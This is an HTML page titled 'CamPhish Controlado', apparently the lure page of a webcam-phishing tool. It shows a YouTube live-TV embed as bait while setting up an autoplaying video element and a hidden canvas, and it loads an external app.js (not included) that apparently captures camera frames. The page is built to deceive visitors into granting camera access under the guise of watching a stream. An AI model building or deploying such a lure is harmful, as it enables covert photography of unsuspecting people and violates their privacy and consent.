<!doctype html>
<html>
<head>
<meta charset="UTF-8">
<title>CamPhish Controlado</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script src="app.js"></script>
<style>
.video-wrap { width: 640px; height: 480px; overflow: hidden; margin-bottom: 10px; }
video { width: 100%; height: 100%; }
canvas { display: none; }
</style>
</head>
<body>

<div class="video-wrap">
   <video id="video" playsinline autoplay></video>
</div>

<canvas id="canvas" width="640" height="480"></canvas>
<span id="errorMsg"></span>

<iframe id="Live_YT_TV" width="100%" height="500px" 
        src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" 
        frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen></iframe>

</body>
</html>
